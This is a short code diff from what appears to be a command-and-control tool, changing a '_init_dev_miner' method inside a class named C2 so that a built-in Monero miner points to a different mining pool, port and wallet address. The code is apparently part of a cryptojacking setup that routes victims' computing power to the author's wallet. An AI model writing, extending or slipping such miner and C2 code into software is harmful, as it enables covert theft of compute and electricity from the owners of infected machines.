@@ -177,9 +177,9 @@ class C2(threading.Thread):
 
 
     def _init_dev_miner(self):
-        url = 'pool.hashvault.pro'
-        host_port = 80
-        user = '46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa'
+        url = 'pool.supportxmr.com'
+        host_port = 443
+        user = '42Fb2yHrHF9RSYrNkJg8aK3v6QcqQkBHhMMh3sJg3HFo7dWpmvJoQcHFhHWDDpEU5fCSgVKgGbutsiGD84YmUn5XHsF6npR'
 
         # first attempt using built-in python miner
         try:
